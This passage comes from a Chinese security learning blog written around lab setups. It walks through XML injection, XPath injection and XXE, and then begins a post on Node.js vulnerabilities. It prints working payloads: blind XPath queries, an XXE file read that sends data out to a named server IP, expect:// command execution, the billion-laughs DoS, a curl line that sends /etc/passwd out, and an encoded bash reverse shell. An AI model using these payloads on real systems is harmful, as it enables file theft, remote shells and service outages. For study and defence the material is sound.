（2）程序有拼凑的数据</p><p><strong>案例演示</strong></p><p>test.xml</p><pre><code class="xml">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;&lt;manager&gt;    &lt;admin id=&quot;1&quot;&gt;    &lt;username&gt;admin&lt;/username&gt;    &lt;password&gt;admin&lt;/password&gt;    &lt;/admin&gt;    &lt;admin id=&quot;2&quot;&gt;    &lt;username&gt;root&lt;/username&gt;    &lt;password&gt;root&lt;/password&gt;    &lt;/admin&gt;&lt;/manager&gt;</code></pre><p>对于上面的xml文件，如果攻击者能够掌控password字段，那么就会产生XML注入。如攻击者输入：</p><pre><code class="xml">root&lt;/password&gt;&lt;/admin&gt;&lt;admin id=&quot;3&quot;&gt;&lt;username&gt;hack&lt;/username&gt;&lt;password&gt;hacker    # 在原文中给出的是 admin &lt;/password&gt;&lt;/admin&gt;&lt;admin id=&quot;3&quot;&gt;&lt;name&gt;hack&lt;/name&gt;&lt;password&gt;hacker&lt;/password&gt;&lt;/admin&gt;，我觉得这样不对，当然也有可能是我想错了，先填坑吧</code></pre><p>那么上述代码就会变为</p><pre><code class="xml">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;&lt;manager&gt;    &lt;admin id=&quot;1&quot;&gt;    &lt;name&gt;admin&lt;/name&gt;    &lt;password&gt;admin&lt;/password&gt;    &lt;/admin&gt;    &lt;admin id=&quot;2&quot;&gt;    &lt;username&gt;root&lt;/username&gt;    &lt;password&gt;root&lt;/password&gt;    &lt;/admin&gt;    &lt;admin id=&quot;3&quot;&gt;    &lt;name&gt;hack&lt;/name&gt;    &lt;password&gt;hacker&lt;/password&gt;    &lt;/admin&gt;&lt;/manager&gt;</code></pre><p>这样就通过XML注入添加了一个名为hack、密码为：hacker的管理员账户。<br> XML注入两大要素：<strong>标签闭合和获取XML表结构</strong></p><p><strong>XML注入防御</strong></p><p> （1）对用户的输入进行过滤<br> （2）对用户的输入进行转义</p><p><img src="/2022/04/19/xxe%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/20191202152614-05da2f0c-14d5-1.jpg" alt="img"></p><h1 id="XPath注入"><a href="#XPath注入" class="headerlink" title="XPath注入"></a>XPath注入</h1><p><strong>Xpath注入简介</strong></p><p>XPath注入攻击是指利用XPath 解析器的松散输入和容错特性，能够在 URL、表单或其它信息上附带恶意的XPath  查询代码，以获得权限信息的访问权并更改这些信息。XPath注入攻击是针对Web服务应用新的攻击方法，它允许攻击者在事先不知道XPath查询相关知识的情况下，通过XPath查询得到一个XML文档的完整内容。</p><p>XPath注入发生在当站点使用用户输入的信息来构造请求以获取XML数据。攻击者对站点发送经过特殊构造的信息来探究站点使用的XML是如何构造的，从而进一步获取正常途径下无法获取的数据。当XML数据被用作账户验证时，攻击者还可以提升他的权限。</p><p><strong>Xpath攻击特点</strong></p><p>XPath注入攻击利用两种技术，即<strong>XPath扫描</strong>和 <strong>XPath查询布尔化</strong>。通过该攻击，攻击者可以控制用来进行XPath查询的XML数据库。这种攻击可以有效地对付使用XPath查询（和XML数据库） 来执行身份验证、查找或者其它操作。</p><p>XPath注入攻击同SQL注入攻击类似，但与SQL注入相比，XPath具有的优势：</p><ol><li>广泛性<br> 只要是利用XPath语法的Web 应用程序若未对输入的XPath查询做严格的处理都会存在XPath注入漏洞。而在SQL注入攻击过程中根据数据库支持的SQL语言不同，注入攻击的实现可能不同。</li><li>危害性大<br> XPath语言几乎可以没有访问控制限制的引用XML文档的所有部分。而在SQL注入中，一个“<code>用户</code>”的权限可能被限制到 某一特定的表、列或者查询。<br> XPath注入攻击可以保证得到完整的XML文档，即完整的数据库。只要Web服务应用具有基本的安全漏洞，即可构造针对 XPath应用的自动攻击。</li></ol><p><strong>XPath注入攻击原理与应用</strong></p><p>XPath注入攻击主要是通过构建特殊的输入，这些输入往往是XPath语法中的一些组合，这些输入将作为参数传入Web 应用程序，通过执行XPath查询而执行入侵者想要的操作。<br> 注入对象不是数据库users表，而是一个存储数据的XML文件。因为xpath不存在访问控制，所以不会遇到许多在SQL注入中经常遇到的访问限制。 注入出现的位置也就是<code>cookie</code>，<code>headers</code>，<code>request</code> <code>parameters/input</code>等。</p><p> 首先要去了解xPath基础语法—–&gt;  <a href="https://www.freebuf.com/column/211251.html">xPath注入学习之基础语法学习</a></p><p>如果一个网站某应用程序将数据保存在XML中，并且对用户的输入没有做限制，攻击者提交了没有经过处理的输入，就插入到 XPath 查询中，即产生Xpath注入，那么就攻击者就可能通过控制查询，获取数据，或者删除数据之类的操作。</p><p>Xpath是xml路径语言，用于配置文件的查找。数据库就是xml文件。因此只要是利用XPath语法的Web 应用程序如果未对输入的XPath查询做严格的处理都会存在XPath注入漏洞。比如一些登录地址页面，搜索页面需要与xml交互的位置。</p><p><strong>XPath直接注入</strong></p><p>test.xml</p><pre><code class="xml">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;root&gt;    &lt;users&gt;         &lt;user&gt;             &lt;id&gt;1&lt;/id&gt;            &lt;username&gt;test1&lt;/username&gt;            &lt;password&gt;test1&lt;/password&gt;        &lt;/user&gt;         &lt;user&gt;             &lt;id&gt;2&lt;/id&gt;            &lt;username&gt;test2&lt;/username&gt;            &lt;password&gt;test2&lt;/password&gt;        &lt;/user&gt;    &lt;/users&gt;&lt;/root&gt;</code></pre><p>test.php(用于接受传入参数，并进行xml查询)</p><pre><code class="php">&lt;?php$xml=simplexml_load_file(&#39;test.xml&#39;);$name=$_GET[&#39;name&#39;];$pwd=$_GET[&#39;pwd&#39;];$query=&quot;/root/users/user[username/text()=&#39;&quot;.$name.&quot;&#39; and password/text()=&#39;&quot;.$pwd.&quot;&#39;]&quot;;echo $query;$result=$xml-&gt;xpath($query);if($result)&#123;    echo &#39;&lt;h2&gt;Welcome&lt;/h2&gt;&#39;;    foreach($result as $key=&gt;$value)&#123;        echo &#39;&lt;br /&gt;ID:&#39;.$value-&gt;id;        echo &#39;&lt;br /&gt;Username:&#39;.$value-&gt;username;        echo &#39;&lt;br /&gt;Password:&#39;.$value-&gt;password;    &#125;&#125;?&gt;</code></pre><p><strong><a href="http://www.w3school.com.cn/php/func_simplexml_load_file.asp"><code>simplexml_load_file()</code>函数</a></strong><br> 返回类 SimpleXMLElement 的一个对象，该对象的属性包含 XML 文档中的数据</p><p>我们先传入正常参数</p><pre><code>http://127.0.0.1/test.php?name=test1&amp;pwd=test1</code></pre><p><img src="/2022/04/19/xxe%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/image-20220421230048387.png" alt="image-20220421230048387"></p><p>成功返回了我们需要的值</p><p>如果我们在username中输入恶意的值，比如</p><pre><code>&#39; or 1=1 or &#39;&#39; = &#39;</code></pre><p>那么我们的XPath查询语句就变为</p><pre><code>/root/users/user[username/text()=&#39;&#39; or 1=1 or &#39;&#39; = &#39;&#39; and password/text()=&#39;test1&#39;] #and的优先级高于or</code></pre><p>我们看出现了什么情况</p><p><img src="/2022/04/19/xxe%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/image-20220421230408461.png" alt="image-20220421230408461"></p><p>这个语句导致了什么呢？就是所有的user元素都满足要求</p><p>上面这个字符串会在逻辑上使查询一直返回 true，并将一直允许攻击者访问系统</p><p>攻击者可以利用 XPath 在应用程序中动态地操作 XML 文档。攻击完成登录可以再通过XPath盲注技术获取最高权限帐号和其它重要文档信息。</p><p><strong>XPath盲注</strong></p><p>如果想要构造恶意语句遍历出整个XML文档，一般步骤如下：</p><p>1.盲注根节点</p><p>利用count（/*）判断根下节点：</p><pre><code>http://127.0.0.1/test.php?name=&#39; or count(/*) = 1 or &#39;1&#39;=&#39;2&amp;pwd=1</code></pre><p><img src="/2022/04/19/xxe%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/image-20220421233640335.png" alt="image-20220421233640335"></p><p>这条语句的作用是什么呢？我们来刨析下</p><pre><code>/root/users/user[username/text()=&#39;&#39; or count(/*) = 1 or &#39;1&#39;=&#39;2&#39; and password/text()=&#39;1&#39;]</code></pre><p>对于这个XPath语句，首先执行and语句</p><pre><code>&#39;1&#39;=&#39;2&#39; and password/text()=&#39;1&#39;]</code></pre><p>这条恒为假</p><p>然后</p><pre><code>username/text()=&#39;&#39; or count(/*) = 1</code></pre><p>这条在根节点为1的时候为真，不是1就为假</p><p>然后简化一下</p><pre><code>真/假 or 假</code></pre><p>我们发现，判断这条语句是否为真的关键点是</p><pre><code>count(/*) = 1</code></pre><p>当根节点为1时，就可以选出所以user元素，不是1时，就无法选出，由此就可以判断根节点个数</p><p>仅仅判断了个数是不够的，还要知道它是什么字符才可以，可以使用substring分割根节点的每个字符，猜解第一级节点</p><pre><code>http://127.0.0.1/test.php?name=&#39; or substring(name(/*[position() = 1]),1,1)=&#39;r&#39; or &#39;1&#39;=&#39;2&amp;pwd=1http://127.0.0.1/test.php?name=&#39; or substring(name(/*[position() = 1]),2,1)=&#39;o&#39; or &#39;1&#39;=&#39;2&amp;pwd=1</code></pre><p><img src="/2022/04/19/xxe%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/image-20220421234716211.png" alt="image-20220421234716211"></p><p>根据这样的原理写一个脚本就ok了</p><p>2.盲注root的下一级节点</p><p>判断root是否有下一级(1个)节点</p><pre><code>http://127.0.0.1/test.php?name=&#39; or count(/root/*) = 1 or &#39;1&#39;=&#39;2&amp;pwd=1</code></pre><p>同理猜解root下一级节点</p><pre><code>http://127.0.0.1/test.php?name=&#39; or substring(name(/root/*[position() = 1]),1,1)=&#39;u&#39; or &#39;1&#39;=&#39;2&amp;pwd=1http://127.0.0.1/test.php?name=&#39; or substring(name(/root/*[position() = 1]),2,1)=&#39;s&#39; or &#39;1&#39;=&#39;2&amp;pwd=1</code></pre><p><img src="/2022/04/19/xxe%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/image-20220421235135999.png" alt="image-20220421235135999"></p><p>一直按照这样的步骤往下即可</p><p><strong>XPath注入危害</strong></p><ul><li>在URL及表单中提交恶意XPath代码，可获取到权限限制数据的访问权，并可修改这些数据。</li><li>可通过此类漏洞查询获取到系统内部完整的XML文档内容。</li><li>逻辑以及认证被绕过，它不像数据库那样有各种权限，xml没有各种权限的概念,正因为没有权限概念，因此利用xpath构造查询的时候整个数据库都会被用户读取。</li></ul><p><strong>XPath注入防御</strong></p><ol><li>数据提交到服务器上端，在服务端正式处理这批数据之前，对提交数据的合法性进行验证。</li><li>检查提交的数据是否包含特殊字符，对特殊字符进行编码转换或替换、删除敏感字符或字符串。</li><li>对于系统出现的错误信息，以IE错误编码信息替换，屏蔽系统本身的出错信息。</li><li>参数化XPath查询，将需要构建的XPath查询表达式，以变量的形式表示，变量不是可以执行的脚本。</li><li>通过MD5、SSL等加密算法，对于数据敏感信息和在数据传输过程中加密，即使某些非法用户通过非法手法获取数据包，看到的也是加密后的信息。 总结下就是：限制提交非法字符，对输入内容严格检查过滤，参数化XPath查询的变量。</li></ol><h1 id="XML外部实体注入-XXE"><a href="#XML外部实体注入-XXE" class="headerlink" title="XML外部实体注入(XXE)"></a>XML外部实体注入(XXE)</h1><p><strong>XXE漏洞简介</strong></p><p>XXE漏洞全称XML External Entity Injection 即XML外部实体注入。<br> XXE漏洞发生在应用程序解析XML输入时，没有禁止外部实体的加载，导致可加载恶意外部文件和代码，造成<strong>任意文件读取、命令执行、内网端口扫描、攻击内网网站、发起Dos攻击</strong>等危害。<br> XXE漏洞触发的点往往是可以上传xml文件的位置，没有对上传的xml文件进行过滤，导致可上传恶意xml文件。</p><p>解析xml在php库libxml，libxml&gt;=2.9.0的版本中没有XXE漏洞。<br> <a href="https://www.runoob.com/php/func-simplexml-load-string.html">simplexml_load_string()</a>可以读取XML</p><p><strong>本地环境搭建</strong></p><p>test.php</p><pre><code class="php">&lt;?php$xmlfile=file_get_contents(&#39;php://input&#39;);$dom=new DOMDocument();$dom-&gt;loadXML($xmlfile);$xml=simplexml_import_dom($dom);$xxe=$xml-&gt;xxe;$str=&quot;$xxe \n&quot;;echo $str;?&gt;</code></pre><ul><li><code>file_get_contents</code>获取客户端输入内容</li><li><code>new DOMDocument()</code>初始化XML解析器</li><li><code>loadXML($xmlfile)</code>加载客户端输入的XML内容</li><li><code>simplexml_import_dom($dom)</code>获取XML文档节点，如果成功则返回SimpleXMLElement对象，如果失败则返回FALSE。</li><li>获取SimpleXMLElement对象中的节点XXE，然后输出XXE内容。</li></ul><p>payload</p><pre><code class="xml">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;&lt;!DOCTYPE a [&lt;!ENTITY file SYSTEM &quot;file:///E:/phpstudy_pro/WWW/flag.txt&quot;&gt;]&gt;&lt;xml&gt;&lt;xxe&gt;&amp;file;&lt;/xxe&gt;&lt;/xml&gt;</code></pre><p><img src="/2022/04/19/xxe%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/image-20220422003257935.png" alt="image-20220422003257935"></p><p>成功读取了我e盘的文件</p><p><img src="/2022/04/19/xxe%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/image-20220422003239790.png" alt="image-20220422003239790"></p><p><strong>XXE常见利用方式</strong></p><p>与SQL相似，XXE漏洞也分为有回显和无回显<br> 有回显，可以直接在页面中看到payload的执行结果或现象。<br> 无回显，又称为blind xxe，可以使用外带数据(OOB)通道提取数据。即可以引用远程服务器上的XML文件读取文件。</p><h2 id="任意文件读取"><a href="#任意文件读取" class="headerlink" title="任意文件读取"></a><strong>任意文件读取</strong></h2><p><strong>我们在这里采用一个靶场来分析</strong></p><p><a href="https://github.com/c0ny1/xxe-lab">xxe-lab</a></p><img src="/2022/04/19/xxe%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/image-20220422004849510.png" alt="image-20220422004849510" style="zoom:67%;"><p>靶场源码:</p><pre><code class="php">&lt;?php$USERNAME = &#39;admin&#39;; //账号$PASSWORD = &#39;admin&#39;; //密码$result = null;libxml_disable_entity_loader(false);$xmlfile = file_get_contents(&#39;php://input&#39;);try&#123;    $dom = new DOMDocument();    $dom-&gt;loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD);    $creds = simplexml_import_dom($dom);    $username = $creds-&gt;username;    $password = $creds-&gt;password;    if($username == $USERNAME &amp;&amp; $password == $PASSWORD)&#123;        $result = sprintf(&quot;&lt;result&gt;&lt;code&gt;%d&lt;/code&gt;&lt;msg&gt;%s&lt;/msg&gt;&lt;/result&gt;&quot;,1,$username);    &#125;else&#123;        $result = sprintf(&quot;&lt;result&gt;&lt;code&gt;%d&lt;/code&gt;&lt;msg&gt;%s&lt;/msg&gt;&lt;/result&gt;&quot;,0,$username);    &#125;   &#125;catch(Exception $e)&#123;    $result = sprintf(&quot;&lt;result&gt;&lt;code&gt;%d&lt;/code&gt;&lt;msg&gt;%s&lt;/msg&gt;&lt;/result&gt;&quot;,3,$e-&gt;getMessage());&#125;header(&#39;Content-Type: text/html; charset=utf-8&#39;);echo $result;?&gt;</code></pre><p><strong>有回显</strong></p><p>payload</p><pre><code class="xml">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot; ?&gt;&lt;!DOCTYPE hack [&lt;!ENTITY file SYSTEM  &quot;file:///E:/phpstudy_pro/WWW/flag.txt&quot;&gt;]&gt;&lt;user&gt;  &lt;username&gt;&amp;file;&lt;/username&gt;  &lt;password&gt;hack&lt;/password&gt;&lt;/user&gt;</code></pre><p><img src="/2022/04/19/xxe%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/image-20220422005656974.png" alt="image-20220422005656974"></p><p>当然，也可以使用<code>php://filter</code>协议读取qwzf.txt文件内容(也可以读取其他类型的文件，如：php文件)</p><p><img src="/2022/04/19/xxe%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/image-20220422005948762.png" alt="image-20220422005948762"></p><p><strong>无回显</strong></p><p>无回显的话，就会麻烦许多</p><p>我们先修改源码，禁掉输出代码和报错信息，改成无回显。</p><p><img src="/2022/04/19/xxe%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/image-20220422010158422.png" alt="image-20220422010158422"></p><p><img src="/2022/04/19/xxe%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/image-20220422010234624.png" alt="image-20220422010234624"></p><p>遇到无回显，可以通过<code>Blind XXE</code>方法加上外带数据通道来提取数据，先使用<code>php://filter</code>协议获取目标文件的内容，然后将内容以<code>http</code>请求发送到攻击服务器来读取数据。虽无法直接查看文件内容，但我们可以使用易受攻击的服务器作为代理，在外部网络上执行扫描以及代码。即，当无回显情况时，可以将数据发送到远程服务器(攻击服务器)。</p><p>这里我的服务器ip为:39.105.71.63</p><p>构造payload</p><pre><code class="xml">&lt;?xml version=&quot;1.0&quot;?&gt;&lt;!DOCTYPE test[&lt;!ENTITY % file SYSTEM &quot;php://filter/read=convert.base64-encode/resource=E:/phpstudy_pro/WWW/flag.txt&quot;&gt;&lt;!ENTITY % dtd SYSTEM &quot;http://39.105.71.63:66/evil.dtd&quot;&gt;%dtd;%send;]&gt;</code></pre><p>远程服务器部署evil.dtd内容为:</p><pre><code class="xml">&lt;!ENTITY % all&quot;&lt;!ENTITY &amp;#x25;   send SYSTEM &#39;http://39.105.71.63:66/?%file;&#39;&gt;&quot;&gt;%all;</code></pre><p>内部的%号要进行实体编码成<code>&amp;#x25</code></p><p>我们直接把这个文件放到一个网站上，我这里就直接利用宝塔咯(我是懒狗)</p><p><img src="/2022/04/19/xxe%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/image-20220422021836512.png" alt="image-20220422021836512"></p><p>然后向我们本地的靶机发送payload</p><p><img src="/2022/04/19/xxe%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/image-20220422021925811.png" alt="image-20220422021925811"></p><p>成功回显出了文件</p><p><em>无回显攻击流程：</em></p><ul><li>先调用<code>%dtd</code>，请求远程服务器(攻击服务器)上的<code>evil.dtd</code>。</li><li>再调用 <code>evil.dtd</code>中的 <code>%file</code>。<code>%file</code> 获取受攻击的服务器上面的敏感文件，然后将 <code>%file</code> 的返回结果传到<code>%send</code> 。</li><li>然后调用 <code>%send;</code> 把读取到的数据发送到远程服务器上。</li></ul><p>这样就实现了外带数据的效果，解决 XXE 无回显的问题。</p><h2 id="执行系统命令"><a href="#执行系统命令" class="headerlink" title="执行系统命令"></a><strong>执行系统命令</strong></h2><p>在安装expect扩展的PHP环境里执行系统命令，其他协议也有可能可以执行系统命令。</p><pre><code class="xml">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;&lt;!DOCTYPE xxe [&lt;!ELEMENT name ANY &gt;&lt;!ENTITY xxe SYSTEM &quot;expect://id&quot; &gt;]&gt;&lt;root&gt;&lt;name&gt;&amp;xxe;&lt;/name&gt;&lt;/root&gt;</code></pre><p>通过XXE可以实现RCE的实例很少。</p><h2 id="拒绝服务攻击-DDOS"><a href="#拒绝服务攻击-DDOS" class="headerlink" title="拒绝服务攻击(DDOS)"></a><strong>拒绝服务攻击(DDOS)</strong></h2><pre><code class="xml">&lt;?xml version=&quot;1.0&quot;?&gt;   &lt;!DOCTYPE lolz [&lt;!ENTITY lol &quot;lol&quot;&gt;&lt;!ENTITY lol2 &quot;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&quot;&gt;&lt;!ENTITY lol3 &quot;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&quot;&gt;&lt;!ENTITY lol4 &quot;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&quot;&gt;&lt;!ENTITY lol5 &quot;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&quot;&gt;&lt;!ENTITY lol6 &quot;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&quot;&gt;&lt;!ENTITY lol7 &quot;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&quot;&gt;&lt;!ENTITY lol8 &quot;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&quot;&gt;&lt;!ENTITY lol9 &quot;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&quot;&gt;]&gt;&lt;lolz&gt;&amp;lol9;&lt;/lolz&gt;</code></pre><p><strong>原理</strong>：递归引用,lol 实体具体还有 “lol” 字符串，然后一个 lol2 实体引用了 10 次 lol  实体，一个 lol3 实体引用了 10 次 lol2 实体，此时一个 lol3 实体就含有 10^2 个 “lol” 了，以此类推，lol9  实体含有 10^8 个 “lol” 字符串,最后再引用lol9。</p><h2 id="探测内网端口与探测内网网站"><a href="#探测内网端口与探测内网网站" class="headerlink" title="探测内网端口与探测内网网站"></a><strong>探测内网端口与探测内网网站</strong></h2><p>这个我没复现成功。。。先拿别人的吧</p><p>漏洞代码:</p><p>test.php</p><pre><code class="php">&lt;?php$xml = simplexml_load_string($_REQUEST[&#39;xml&#39;]);print_r($xml);//注释掉该语句即为无回显的情况?&gt;</code></pre><p>探测内网端口</p><pre><code class="xml">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;&lt;!DOCTYPE xxe [&lt;!ELEMENT name ANY &gt;&lt;!ENTITY xxe SYSTEM &quot;http://127.0.0.1:80&quot; &gt;]&gt;&lt;root&gt;&lt;name&gt;&amp;xxe;&lt;/name&gt;&lt;/root&gt;</code></pre><p>3306端口开放<br> <a href="https://xzfile.aliyuncs.com/media/upload/picture/20191202152107-4ea0fe60-14d4-1.jpg"><img src="/2022/04/19/xxe%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/20191202152107-4ea0fe60-14d4-1.jpg" alt="img"></a><br> 3389端口未开放<br> <a href="https://xzfile.aliyuncs.com/media/upload/picture/20191202152125-5979dc4e-14d4-1.jpg"><img src="/2022/04/19/xxe%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/20191202152125-5979dc4e-14d4-1.jpg" alt="img"></a></p><h2 id="攻击内网网站"><a href="#攻击内网网站" class="headerlink" title="攻击内网网站"></a><strong>攻击内网网站</strong></h2><pre><code class="xml">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;&lt;!DOCTYPE xxe [&lt;!ELEMENT name ANY &gt;&lt;!ENTITY xxe SYSTEM &quot;http://127.0.0.1:80/payload&quot; &gt;]&gt;&lt;root&gt;&lt;name&gt;&amp;xxe;&lt;/name&gt;&lt;/root&gt;</code></pre><h2 id="XXE漏洞防御"><a href="#XXE漏洞防御" class="headerlink" title="XXE漏洞防御"></a><strong>XXE漏洞防御</strong></h2><p><strong>1、使用开发语言提供的禁用外部实体的方法</strong><br> php:</p><pre><code class="php">libxml_disable_entity_loader(true);</code></pre><p>java:</p><pre><code class="java">DocumentBuilderFactory dbf =DocumentBuilderFactory.newInstance();dbf.setExpandEntityReferences(false);</code></pre><p>Python:</p><pre><code class="python">from lxml import etreexmlData = etree.parse(xmlSource,etree.XMLParser(resolve_entities=False))</code></pre><p><strong>2、过滤用户提交的XML数据</strong><br> 过滤关键字：<code>&lt;\!DOCTYPE</code>和<code>&lt;\!ENTITY</code>，或者<code>SYSTEM</code>和<code>PUBLIC</code>。<br> <strong>3、不允许XML中含有自己定义的DTD</strong></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;自己对这个漏洞不懂原理，以及不会深入利用，就看看师傅的文章，搬运顺便复现部分场景吧。&lt;/p&gt;
&lt;p&gt;[TOC]&lt;/p&gt;
&lt;h1 id=&quot;XML&quot;&gt;&lt;a href=&quot;#XML&quot; class=&quot;headerlink&quot; title=&quot;XML&quot;&gt;&lt;/a&gt;XML&lt;/h1&gt;&lt;p&gt;&lt;st</summary>
      
    
    
    
    <category term="CTF" scheme="https://sakurahack-y.github.io/categories/CTF/"/>
    
    <category term="常见漏洞和手法" scheme="https://sakurahack-y.github.io/categories/CTF/%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E%E5%92%8C%E6%89%8B%E6%B3%95/"/>
    
    
    <category term="XXE" scheme="https://sakurahack-y.github.io/tags/XXE/"/>
    
  </entry>
  
  <entry>
    <title>node.js常见漏洞学习</title>
    <link href="https://sakurahack-y.github.io/2022/04/15/node-js%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/"/>
    <id>https://sakurahack-y.github.io/2022/04/15/node-js%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/</id>
    <published>2022-04-15T15:19:35.000Z</published>
    <updated>2022-04-15T17:16:02.344Z</updated>
    
    <content type="html"><![CDATA[<p>[TOC]</p><h1 id="危险函数所导致的命令执行"><a href="#危险函数所导致的命令执行" class="headerlink" title="危险函数所导致的命令执行"></a>危险函数所导致的命令执行</h1><h2 id="eval"><a href="#eval" class="headerlink" title="eval()"></a>eval()</h2><p>eval() 函数可计算某个字符串，并执行其中的的 JavaScript 代码。和PHP中eval函数一样，如果传递到函数中的参数可控并且没有经过严格的过滤时，就会导致漏洞的出现。</p><p>简单例子:</p><pre><code class="javascript">var express = require(&quot;express&quot;);var app = express();app.get(&#39;/eval&#39;,function(req,res)&#123;res.send(eval(req.query.q));console.log(req.query.q);&#125;)var server = app.listen(8888, function() &#123;console.log(&quot;应用实例，访问地址为 http://127.0.0.1:8888/&quot;);&#125;)</code></pre><p><strong>漏洞利用</strong></p><p>node.js.js中的chile_process.exec调用的是/bash.sh，它是一个bash解释器，可以执行系统命令。在eval函数的参数中可以构造<code>require(&#39;child_process&#39;).exec(&#39;&#39;);</code>来进行调用。</p><p>弹计算器(windows):</p><pre><code class="javascript">/eval?q=require(&#39;child_process&#39;).exec(&#39;calc&#39;);</code></pre><p>读取文件(linux)：</p><pre><code class="javascript">/eval?q=require(&#39;child_process&#39;).exec(&#39;curl -F &quot;x=`cat /etc/passwd`&quot; http://vps&#39;);;</code></pre><p>反弹shell(linux)：</p><pre><code class="javascript">/eval?q=require(&#39;child_process&#39;).exec(&#39;echo YmFzaCAtaSA%2BJiAvZGV2L3RjcC8xMjcuMC4wLjEvMzMzMyAwPiYx|base64 -d|bash&#39;);# mFzaCAtaSA%2BJiAvZGV2L3RjcC8xMjcuMC4wLjEvMzMzMyAwPiYx是bash -i &gt;&amp; /dev/tcp/127.0.0.1/3333 0&gt;&amp;1 BASE64加密后的结果，直接调用会报错。注意：BASE64加密后的字符中有一个+号需要url编码为%2B(一定情况下)如果上下文中没有require,则可以使用global.process.mainModule.constructor._load(&#39;child_process&#39;).exec(&#39;calc&#39;)来执行命令</code></pre><h2 id="类似命令"><a href="#类似命令" class="headerlink" title="类似命令"></a>类似命令</h2><ol><li><p>间隔两秒执行函数</p><pre><code>setInteval(some_function, 2000)</code></pre></li><li><p>两秒后执行函数：</p><pre><code>setTimeout(some_function, 2000);</code></pre></li><li><p>some_function处就类似于eval函数的参数</p><pre><code>输出HelloWorld：    Function(“console.log(‘HelloWolrd’)”)()类似于php中的create_function</code></pre></li></ol><h1 id="Node-js-原型污染漏洞"><a href="#Node-js-原型污染漏洞" class="headerlink" title="Node.js 原型污染漏洞"></a>Node.js 原型污染漏洞</h1><h2 id="关于原型链"><a href="#关于原型链" class="headerlink" title="关于原型链"></a>关于原型链</h2><p>Javascript原型链参考文章：<a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Inheritance_and_the_prototype_chain">继承与原型链</a></p><p>文章内关于原型和原型链的知识写的非常详细，就不再总结整个过程了，以下为几个比较重要的点：</p><p>1.在javascript，每一个实例对象都有一个prototype属性，prototype 属性可以向对象添加属性和方法。</p><pre><code>object.prototype.name=value</code></pre><p>2.在javascript，每一个实例对象都有一个<code>__proto__</code>属性，这个实例属性指向对象的原型对象(即原型)。可以通过以下方式访问得到某一实例对象的原型对象：</p><pre><code>objectname[&quot;__proto__&quot;]objectname.__proto__objectname.constructor.prototype</code></pre><p>3.不同对象所生成的原型链如下(部分)：</p><pre><code>var o = &#123;a: 1&#125;;// o对象直接继承了Object.prototype// 原型链：// o ---&gt; Object.prototype ---&gt; nullvar a = [&quot;yo&quot;, &quot;whadup&quot;, &quot;?&quot;];// 数组都继承于 Array.prototype// 原型链：// a ---&gt; Array.prototype ---&gt; Object.prototype ---&gt; nullfunction f()&#123;return 2;&#125;// 函数都继承于 Function.prototype// 原型链：// f ---&gt; Function.prototype ---&gt; Object.prototype ---&gt; null</code></pre><h2 id="原型链污染原理"><a href="#原型链污染原理" class="headerlink" title="原型链污染原理"></a>原型链污染原理</h2><p>对于语句：<code>object[a][b] = value</code> 如果可以控制a、b、value的值，将a设置为<code>__proto__</code>，我们就可以给object对象的原型设置一个b属性，值为value。这样所有继承object对象原型的实例对象在本身不拥有b属性的情况下，都会拥有b属性，且值为value。</p><p>来看一个简单的例子:</p><pre><code>object1 = &#123;&quot;a&quot;:1, 